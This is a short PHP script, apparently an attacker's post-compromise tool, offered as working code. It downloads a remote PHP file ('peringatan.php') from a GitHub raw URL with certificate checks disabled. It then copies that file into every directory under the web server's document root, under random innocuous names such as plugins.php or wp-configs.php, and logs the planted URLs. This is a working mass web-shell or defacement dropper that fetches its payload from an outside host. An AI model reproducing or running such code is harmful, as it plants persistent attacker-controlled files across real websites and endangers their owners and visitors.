<?php
error_reporting(0);

$searchDir = $_SERVER['DOCUMENT_ROOT'];
$sourceUrl = "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/peringatan.php";
$baseUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'];
$logFile = "copy_report.txt";

// Daftar nama file yang akan dipilih secara acak
$fileNames = ["product.php", "buy.php", "plugins.php", "default.php", "goods.php", "pages.php", "wp-configs.php"];

function fetchContent($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");

    $data = curl_exec($ch);
    if (curl_errno($ch)) {
        curl_close($ch);
        return false;
    }
    curl_close($ch);
    return $data;
}

function copyToAllDirectories($dir, $url, $logFile, $baseUrl, $fileNames) {
    if (!is_dir($dir)) {
        echo "[ERROR] Dir Not Found: $dir\n";
        return;
    }

    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
    $logEntries = [];

    $content = fetchContent($url);
    if ($content === false || empty($content)) {
        echo "[ERROR] Get Content.\n";
        return;
    }

    foreach ($files as $file) {
        if ($file->isDir()) {
            // Pilih nama file secara acak dari daftar
            $randomFileName = $fileNames[array_rand($fileNames)];
            $filePath = $file->getPathname() . "/" . $randomFileName;
            $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $filePath);
            $fullUrl = $baseUrl . $relativePath;

            if (file_exists($filePath)) {
                echo "[SKIPPED] $fullUrl Already Exist\n";
                $logEntries[] = "[SKIPPED] $fullUrl Already Exist";
                continue;
            }

            if (file_put_contents($filePath, $content) !== false) {
                echo "[COPIED] $fullUrl\n";
                $logEntries[] = "[COPIED] $fullUrl";
            } else {
                echo "[ERROR] Failed : $fullUrl\n";
                $logEntries[] = "[ERROR] Failed : $fullUrl";
            }
        }
    }

    if (!empty($logEntries)) {
        file_put_contents($logFile, implode("\n", $logEntries) . "\n", FILE_APPEND);
    }
}

copyToAllDirectories($searchDir, $sourceUrl, $logFile, $baseUrl, $fileNames);
?>
